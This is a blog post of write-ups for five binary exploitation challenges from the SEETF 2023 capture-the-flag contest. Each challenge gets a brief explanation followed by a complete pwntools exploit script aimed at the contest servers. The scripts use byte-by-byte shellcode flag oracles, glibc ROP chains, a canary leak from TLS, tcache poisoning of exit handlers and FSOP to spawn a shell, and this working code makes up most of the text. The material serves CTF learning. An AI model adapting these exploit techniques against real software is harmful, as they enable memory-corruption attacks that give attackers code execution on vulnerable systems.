---
title: SEETF 2023 Pwn Writeups
date: 2023-06-12T05:59:12Z
draft: false
description: brief writeup on pwn challenges from seetf 2023
tocOpen: true
---

# SEETF Brief Writeup on Pwns

## Shellcode As A Service

As indicated by the challenge name and description, we have to write shellcode that will be executed by the program.

We are given an initial write of 6 bytes long, which allows us to get a second stage write. There is **open, read** seccomp, preventing us from printing flag.

We can write a loop in assembly to read one character at a time, and terminate if the character is incorrect.

```python
from pwn import *


context.terminal = ["tmux", "neww"]
context.binary = ELF("./chall")

# first stage
sc1 = asm("""
mov esi, edx
xor edi, edi
syscall
""")

# second stage
sc2 = b"\x90" * len(sc1) + asm("""
mov rbx, 0x67616c662f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x2
syscall

mov rdi, rax
mov rsi, 0x1337500
mov rdx, 0x100
mov rax, 0
syscall

xor r8, r8
jmp loop2

loop:
inc r8

loop2:
mov rax, 0
mov rdi, 0
mov rsi, 0x1337900
add rsi, r8
mov rdx, 0x2
syscall

mov al, [0x1337900+r8]
mov bl, [0x1337500+r8]
cmp al, bl
je loop

crash:
xor rax, rax
mov byte [rax], al
""")


charset = "{_}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$"
ptr = -1
known = "SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}"

with log.progress("enumerating") as pro:
    while known[-1] != "}":

        ptr += 1
        if ptr == len(charset):
            ptr = 0

        with context.quiet:
            p = remote("win.the.seetf.sg", 2002)

        p.send(sc1)
        sleep(0.05)
        p.send(sc2)

        for i in known:
            p.sendline(i.encode())

        p.clean()
        p.sendline(charset[ptr].encode())
        pro.status(known + charset[ptr])

        try:
            p.recv(timeout=0.05)
            p.recv(timeout=0.05)
            p.recv(timeout=0.05)
            known += charset[ptr]
        except EOFError:
            pass
        with context.quiet:
            p.close()

log.success(known)
```

## MMap Note

We can allocate some chunks of size 0x1000.

If we allocate sufficient chunks, we will expend our heap memory and cause our chunk to be mmaped. This allows us to get a chunk that is placed at a constant offset to our libc in memory.

If you analyze the code that writes to the chunk

```c
__int64 write_0()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf("idx = ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < dword_404590 )
  {
    printf("size to write = ");
    __isoc99_scanf("%d", &sizes[v1]);
    if ( sizes[v1] <= 4096 )
    {
      read(0, (void *)chunk[v1], sizes[v1]);
      return 1LL;
    }
    else
    {
      puts("too much");
      return 0LL;
    }
  }
  else
  {
    puts("invalid idx");
    return 0LL;
  }
}
```

We are allowed to read a size that is larger than 0x1000 into the global **sizes** array.

By using the output option, we can print more than 0x1000 bytes from our memory. This also allows us to leak the canary from the **Thread Local Storage (TLS)** which is stored on the same memory page.

Subsequently, we can use our buffer overflow in the main function `read(0, buf, 0x640uLL);` to write a `open -> mmap -> write` rop chain that maps the flag file to memory and write it to stdout.

```python
from pwn import *

idx = -1;

def create():
    global idx
    idx += 1
    p.sendlineafter(b"> ", b"1")
    p.recvuntil(b"is ")
    addr = int(p.recvline(), 16)
    print(f"{idx} - {hex(addr)}")
    return idx, addr

def write(idx, size, data=None):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx = ", str(idx).encode())
    p.sendlineafter(b"write = ", str(size).encode())
    if size < 0x1000:
        p.send(data)

def read(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx = ", str(idx).encode())
    return p.recvuntil(b"1. create note", drop=True)

context.binary = libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = remote("win.the.seetf.sg", 2000)
# p = remote("localhost", 1338)
# p = process("./chall")

for i in range(2):
    create()

prev = create()[1]
while True:
    id, next = create()
    if prev-next > 0x1000:
        break
    prev = next

chunk = next
libc.address = chunk+16384

log.info(f"chunk of {id} at {hex(chunk)}")
log.info(f"libc base @ {hex(libc.address)}")

write(id, 6000)
leak = read(id)
canary = u64(leak[-8:])

log.info(f"canary at {hex(canary)}")

fid, flag_addr = create()
write(fid, 0x5, "/flag")

pop_rax = libc.address + 0x45eb0
pop_rcx = libc.address + 0x8c6bb
pop_rsi = libc.address + 0x2be51
pop_rdi = libc.address + 0x2a3e5
pop_rdx = libc.address + 0x90529  # pop rdx ; pop rbx ; ret
pop_r8  = libc.address + 0x165b76 # pop r8 ; mov eax, 1 ; ret
syscall = libc.address + 0xec3a9

"""
   0x11ea36 <syscall+22>:       mov    r9,QWORD PTR [rsp+0x8]
   0x11ea3b <syscall+27>:       syscall
   0x11ea3d <syscall+29>:       cmp    rax,0xfffffffffffff001
   0x11ea43 <syscall+35>:       jae    0x11ea46 <syscall+38>
   0x11ea45 <syscall+37>:       ret
"""
set_r9  = libc.address + 0x11ea36

payload = fit({
    24: canary,
    40: # open("/flag", 0, 0)
        [pop_rax, 2] + [pop_rdi, flag_addr] + [pop_rsi, 0] + [pop_rdx, 0, 0] + [syscall] +
        # mmap(0x1337000, 0x1000, 3, 0x22, 3, 0)
        [pop_r8, 3] + [pop_rax, 2] + [pop_rdi, 0x1337000] + [pop_rsi, 0x1000] +
        [pop_rdx, 3, 0] + [set_r9, pop_rcx, 0] + [pop_rcx, 0x2] + [libc.sym.mmap] +
        # write(1, 0x1337000, 0x100)
        [pop_rax, 1] + [pop_rdi, 1] + [pop_rsi, 0x1337000] + [pop_rdx, 0x100, 0]
        + [syscall]


})

pause()
p.sendlineafter(b"> ", payload)
p.sendlineafter(b"> ", b"4")

p.interactive()
```

Interestingly, the author provided ROP gadgets in the binary that was easy to use. Unfortunately, I overlooked it and had to get creative with the glibc gadgets.

## Great Expectations

Very straightforward challenge that allows us to stack pivot using float values that we provide, and places a one byte canary as 'security'. 

I used a brute force approach, which should work in ~50 tries.

```python
from pwn import *
import struct

context.terminal = ["tmux", "neww"]
context.binary = elf = ELF("./chall")
libc = ELF("./lib/libc.so.6")

i = 0
with log.progress("enumerating") as pro:
    while True:
        i += 1
        pro.status(f"{i}")
        with context.quiet:
            p = remote("win.the.seetf.sg", 2004)
            # p = process("./chall")

        r1 = b"A"*16 + p64(0x401313) + p64(elf.got.puts) + p64(elf.sym.puts) + p64(0x401233)

        p.sendafter(b"tale.\n", r1 * (0x107 // len(r1)))
        p.sendlineafter(b"number!", str(struct.unpack("<f", p32(0xDDDDDDDD))[0]).encode())
        p.sendlineafter(b"number!", str(struct.unpack("<f", p32(0xDDDDDDDD))[0]).encode())
        p.sendlineafter(b"number!", str(struct.unpack("<f", p32(0xCCE841DD))[0]).encode())

        try:
            leak = unpack(p.recvuntil(b"I live my life taking chances", drop=True).strip(b"\n"), "all")
            log.info(f"leak at {hex(leak)}")
            libc.address = leak - libc.sym.puts

            log.info(f"libc base @ {hex(libc.address)}")
            one_gadget = 0xe3b01+libc.address
            r2 = b"A"*16 + p64(one_gadget)

            p.sendafter(b"tale.\n", r2 * (0x107 // len(r2)))
            p.sendlineafter(b"number!", str(struct.unpack("<f", p32(0xDDDDDDDD))[0]).encode())
            p.sendlineafter(b"number!", str(struct.unpack("<f", p32(0xDDDDDDDD))[0]).encode())
            p.sendlineafter(b"number!", str(struct.unpack("<f", p32(0xCC0841DD))[0]).encode())

            p.interactive()
        except:
            with context.quiet:
                p.close()
            continue
```

## BabySheep

We have a CRUD heap challenge, and the vulnerability is uninitialized stack.

By failing scanf intentitentionally, we can achieve UAF to read and write crucial metadata.

I did a tcache unlinking attach to overwrite exit funcs with system("/bin/sh").

```python
from pwn import *

def create(size, content):
    p.sendlineafter(b"[E]xit\n", b"C")
    p.sendlineafter(b"size?\n", str(size).encode())
    p.sendlineafter(b"content?\n", content)

def output(idx, check=True):
    p.sendlineafter(b"[E]xit\n", b"O")
    p.sendlineafter(b"Which text? (0-9)\n", str(idx).encode())
    if check:
        return p.recvuntil(b"=======", drop=True)
    else:
        return p.recvuntil(b"1. [C]reate", drop=True)

def update(idx, content):
    p.sendlineafter(b"[E]xit\n", b"U")
    p.sendlineafter(b"Which text? (0-9)\n", str(idx).encode())
    p.sendline(content)

def delete(idx):
    p.sendlineafter(b"[E]xit\n", b"D")
    p.sendlineafter(b"Which text? (0-9)\n", str(idx).encode())

context.terminal = ["tmux", "neww"]
context.binary = libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = remote("win.the.seetf.sg", 2001)
# p = process("./chall")

create(0x20, b"A")
delete(0)

heap_leak = (u64(output(1000)[:8]) << 12) + 0x350
log.info(f"heap leak @ {hex(heap_leak)}")

create(0x500, b"B")
create(0x500, b"C")
delete(0)

libc_leak = u64(output(1000, False)[:8])
libc.address = libc_leak - 2202848
xor_key = libc.address - 10384 - 0x30
exit_funcs = libc.address + 2207488 +0x150

log.info(f"libc leak @ {hex(libc_leak)}")
log.info(f"libc base @ {hex(libc.address)}")

delete(0)
delete(1)

create(0x50, b"A")
create(0x50, b"B")
create(0x50, b"C")
delete(2)
delete(1)
delete(0)
create(0x50, b"C")
#p64(e.got.free ^ ((heap_leak+0x2a0) >> 12)))
update(123, p64(xor_key ^ (heap_leak >> 12)))
create(0x50, b"D")
create(0x50, b"")

xor_key = output(2)
p.recvuntil(b"message:\n")
xor_key = u64(p.recvline()[31:39])

delete(0)
delete(1)

create(0x60, b"A")
create(0x60, b"B")
create(0x60, b"C")
delete(3)
delete(1)
delete(0)
create(0x60, b"C")
#p64(e.got.free ^ ((heap_leak+0x2a0) >> 12)))
# update(123, b"A"*8)
"""
0x7f06e8239f00 <initial>:       0x0000000000000a41      0x000000000000000c
0x7f06e8239f10 <initial+16>:    0x0000000000000004      0x4d206e7c920b68a1
"""
update(123, p64(exit_funcs ^ ((heap_leak+0x160) >> 12)))
create(0x60, b"A")
create(0x60, b"\x00"*8 + p64(0xc) + p64(4) + p64(rol(libc.sym.system ^ xor_key, 0x11, 64)) + p64(next(libc.search(b'/bin/sh'))))

p.sendline(b"E")
# gdb.attach(p)

p.interactive()
```

## CSTutorial

CSTutorial featured 3 very powerful vulnerabilities.

1. scanf allows us to have a buffer overflow in BSS
2. OOB array indexing on memcpy
3. integer overflow on calloc to bypass upper bounds

This led me to be very confused on where to start attacking.

Ultimately, I found the most straightforward way for me

1. Leak LIBC by allocating huge MMAPed chunk using vulnerability 3
2. If we set index of buffer to 1 initially, we will write out of bounds at -1. This allows us to have a powerful overflow using vulnerability 1, and overwrite the pointer of all the buffers as well as the file pointer
3. Overwrite all pointers with stdin, and remember not to destroy stdout pointer.
4. Before program exits, it calls fread(stdin, buffer_size, 1, stdin)
5. Overwrite stdin file structure to call system("/bin/sh") on exiting the program using FSOP

```python
from pwn import *

context.binary = libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p = process("./chall")
p = remote("win.the.seetf.sg", 2003)

p.sendlineafter(b"allocate?\n", b"-4000000000")
p.sendlineafter(b"(1-3)\n", b"1")
p.recvuntil(b"chunk @ ")
leak = int(p.recvline().strip(), 16)
libc.address = leak + 294981616

log.info(f"leak @ {hex(leak)}")
log.info(f"libc base @ {hex(libc.address)}")

p.sendlineafter(b"Content: ", b"just for lols")
# gdb.attach(p)

p.sendlineafter(b"Content: ", b"A"*8 + p64(libc.sym._IO_2_1_stdin_-1)*3 + b"A"*24 + p64(libc.sym._IO_2_1_stdout_) + b"B"*0x318 + p64(libc.sym._IO_2_1_stdin_))

standard_FILE_addr = libc.sym._IO_2_1_stdin_

fs = FileStructure()
fs.flags = unpack("  " + "sh".ljust(6, "\x00"), 64)  # "  sh"
fs._IO_write_base = 0
fs._IO_write_ptr = 1
# fs._mode = 0
fs._lock = standard_FILE_addr-0x10
fs.chain = libc.sym.system
fs._codecvt = standard_FILE_addr
fs._wide_data = standard_FILE_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

p.send(bytes(fs))
p.sendline(b"A"*0x100)

p.interactive()```
